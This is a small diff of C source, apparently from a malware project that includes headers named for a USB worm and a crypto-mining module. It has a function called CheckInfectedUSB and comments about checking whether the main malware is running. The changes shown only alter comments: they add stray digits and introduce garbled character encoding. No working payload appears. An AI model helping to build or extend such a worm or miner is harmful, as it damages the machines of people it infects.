@@ -4,7 +4,7 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <dirent.h>//libreria necesaria para listar archivos y carpetas con POSIX
-#include <errno.h>//necesaria para la funcion CheckInfectedUSB
+#include <errno.h>//necesaria para la funcion CheckInfectedUSB88888888888
 #include "cryptocoin.h"
 #include "os_check.h"
 #include "usb_worm.h"
@@ -185,7 +185,7 @@ void vigiaExterno(){
         }
         if(Conectado==true){
             //abrimos un archivo si es igual a 1
-            //es señal que si se esta ejecutando el malwared
+            //es seÃ±al que si se esta ejecutando el malwared
             //principal
              printf("el malwared se esta ejecutando\n");
              Sleep(15210);
